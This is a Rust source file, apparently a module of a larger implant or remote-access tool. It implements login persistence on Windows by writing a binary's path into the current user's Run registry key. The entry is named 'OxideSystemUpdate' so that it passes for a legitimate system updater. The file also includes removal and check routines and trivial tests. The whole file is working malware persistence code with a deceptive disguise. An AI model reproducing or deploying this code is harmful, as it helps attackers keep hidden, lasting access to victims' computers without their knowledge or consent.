use crate::persistence::PersistenceTrait;
use std::path::Path;

pub struct RegistryRunPersistence;
const VALUE_NAME: &str = "OxideSystemUpdate";
const RUN_KEY: &str = r"Software\Microsoft\Windows\CurrentVersion\Run";

#[cfg(target_os = "windows")]
impl PersistenceTrait for RegistryRunPersistence {
    fn install(&self, binary_path: &Path) -> anyhow::Result<()> {
        use winreg::enums::*;
        use winreg::RegKey;
        let run = RegKey::predef(HKEY_CURRENT_USER).open_subkey_with_flags(RUN_KEY, KEY_WRITE)?;
        let s = binary_path
            .to_str()
            .ok_or_else(|| anyhow::anyhow!("invalid path"))?;
        run.set_value(VALUE_NAME, &s)?;
        Ok(())
    }
    fn remove(&self) -> anyhow::Result<()> {
        use winreg::enums::*;
        use winreg::RegKey;
        RegKey::predef(HKEY_CURRENT_USER)
            .open_subkey_with_flags(RUN_KEY, KEY_WRITE)?
            .delete_value(VALUE_NAME)?;
        Ok(())
    }
    fn check(&self) -> bool {
        use winreg::enums::*;
        use winreg::RegKey;
        RegKey::predef(HKEY_CURRENT_USER)
            .open_subkey(RUN_KEY)
            .and_then(|k| k.get_value::<String, _>(VALUE_NAME))
            .is_ok()
    }
    fn name(&self) -> &'static str {
        "registry_run"
    }
}

#[cfg(not(target_os = "windows"))]
impl PersistenceTrait for RegistryRunPersistence {
    fn install(&self, _: &Path) -> anyhow::Result<()> {
        anyhow::bail!("registry not available on this platform")
    }
    fn remove(&self) -> anyhow::Result<()> {
        Ok(())
    }
    fn check(&self) -> bool {
        false
    }
    fn name(&self) -> &'static str {
        "registry_run"
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    #[test]
    fn value_name_stable() {
        assert_eq!(VALUE_NAME, "OxideSystemUpdate");
    }
    #[test]
    fn run_key_correct() {
        assert!(RUN_KEY.contains(r"CurrentVersion\Run"));
    }
}
